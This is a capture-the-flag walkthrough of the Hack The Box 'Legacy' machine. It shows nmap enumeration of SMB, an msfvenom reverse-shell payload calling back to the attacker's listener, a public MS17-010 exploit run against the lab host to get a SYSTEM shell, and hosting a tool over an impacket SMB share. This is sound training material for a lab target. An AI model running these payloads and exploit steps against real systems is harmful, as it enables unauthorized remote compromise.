# Legacy
[Legacy](https://app.hackthebox.com/machines/2) is a pretty easy Windows box which focuses on exploiting the MS17-010 vulnerability. 

## Enumeration

The first thing to do would be to run an all port scan to determine all the ports that are open.

```
┌──(kali㉿kali)-[~/Desktop/htb/legacy]
└─$ sudo nmap -p- -sS -T4 10.10.10.4
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-18 18:18 EDT
Nmap scan report for 10.10.10.4
Host is up (0.21s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 751.82 seconds
```

It can be seen that ports 135, 139 and 445 are open. So, we can run an intensive scan over only these 3 ports.

```
┌──(kali㉿kali)-[~/Desktop/htb/legacy]
└─$ sudo nmap -p135,139,445 -sC -sV -O 10.10.10.4
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-18 18:38 EDT
Nmap scan report for 10.10.10.4
Host is up (0.19s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows XP SP2 or SP3 (96%), Microsoft Windows XP SP3 (96%), Microsoft Windows Server 2003 SP1 or SP2 (94%), Microsoft Windows Server 2003 SP2 (94%), Microsoft Windows Server 2003 SP1 (94%), Microsoft Windows 2003 SP2 (94%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (93%), Microsoft Windows XP Professional SP2 or Windows Server 2003 (93%), Microsoft Windows 2000 SP3/SP4 or Windows XP SP1/SP2 (93%), Microsoft Windows XP SP2 or SP3, or Windows Embedded Standard 2009 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h27m33s, deviation: 2h07m16s, median: 4d22h57m33s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:45:6c (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2022-08-24T03:36:39+03:00

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.88 seconds
```

It can be seen that the target OS is pretty old and it also looks like it has SMB2 running on it. So, we can use `nmap` to scan the target for any SMB related vulnerabilities.

```
┌──(kali㉿kali)-[~/Desktop/htb/legacy]
└─$ nmap -p139,445 --script smb-vuln* 10.10.10.4
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-18 18:46 EDT
Nmap scan report for 10.10.10.4
Host is up (0.11s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
```

And it can be seen that the target is vulnerable to the infamous MS17-010 RCE. Through some quick googling we can find [this](https://github.com/helviojunior/MS17-010) exploit (This needs python2 or 2.7). We can quickly clone this repository and create a reverse connection payload using `msfvenom` as shown below:

```
┌──(kali㉿kali)-[~/Desktop/htb/legacy]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=1337 -f exe -o ms17-010.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: ms17-010.exe
```

Now the next task is to start a local listener on the port that we used to create the payload:

```
┌──(kali㉿kali)-[~/Desktop/htb/legacy/MS17-010]
└─$ nc -nlvp 1337
listening on [any] 1337 ...
```

And the use the `send_and_execute.py` from the MS17-010 repository to send and execute the payload that we just created.

```
┌──(kali㉿kali)-[~/Desktop/htb/legacy/MS17-010]
└─$ python2.7 send_and_execute.py 10.10.10.4 ../ms17-010.exe 
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x86507da8
SESSION: 0xe105ac18
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe108ef10
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe108efb0
overwriting token UserAndGroups
Sending file QDBFG6.exe...
Opening SVCManager on 10.10.10.4.....
Creating service IAqU.....
Starting service IAqU.....
The NETBIOS connection with the remote host timed out.
Removing service IAqU.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
```

And by the end of execution of this script we get a reverse shell for the target machine

```
┌──(kali㉿kali)-[~/Desktop/htb/legacy/MS17-010]
└─$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.4] 1049
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>sysinfo
sysinfo
'sysinfo' is not recognized as an internal or external command,
operable program or batch file.

C:\WINDOWS\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.
```

But it looks like the commands that we use to confirm the access are not present on the machine. So, we need to send them to the target machine. Our main concern is to make sure we have access as the `SYSTEM` for which we need to run `whoami` and there is a `whoami.exe` file on Kali by default.

```
┌──(kali㉿kali)-[~/Desktop/htb/legacy/MS17-010]
└─$ find / -name whoami.exe -exec cp {} . 2> /dev/null \;
```

To send this over the target machine, we can't use `wget` or `nc` as they are not present on the target machine. So, we can create a SMB server on our machine and host the executable. So, then we can access the SMB share from the target machine and download the same.

We can create an SMB server as

```
┌──(kali㉿kali)-[~/Desktop/htb/legacy/MS17-010]
└─$ /usr/share/doc/python3-impacket/examples/smbserver.py stuff .

Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

*You can find this script by running `find` or `locate` command. There might be multiple results but try each one of them.*

Once, the SMB server is started run the following on the target machine

```
C:\WINDOWS\system32>//10.10.16.4/stuff/whoami.exe
//10.10.16.4/stuff/whoami.exe
NT AUTHORITY\SYSTEM
```

And it can be seen that we have access as `SYSTEM` on the target machine. We can find our flags at

```
C:\Documents and Settings\john\Desktop\user.txt
C:\Documents and Settings\Administrator\Desktop\root.txt
```

## Python2 Troubleshoot
So, the MS17-010 exploit won't run with Python3.* and it needs python2.7 to run properly. When I tried to run it with Python2.7, I found out that I did not have `impacket` module installed. To install the module I had to use `pip` and I had version 3 of pip, so first I had to install `pip2.7` which I did by running the following commands.

```
$ wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
$ sudo python2.7 get-pip.py
```

Now that I had `pip2.7`, I could install `impacket` specifically for Python2.7 but I tried to do so I got another error `error: invalid command 'egg_info'`. To resolve this issue, I installed another package:

```
$ pip2.7 install --upgrade setuptools
```

And finally after this I was able to install `impacke` with the following command:

```
$ python2.7 -m pip install impacket 
```

And after this I was able to run the script with Python2.7.

## Some Key Points to Take Away

1. Always try to troubleshoot any issues that come across while running exploits.

## References
1. [Legacy](https://app.hackthebox.com/machines/2)
2. [MS17-010](https://github.com/helviojunior/MS17-010)
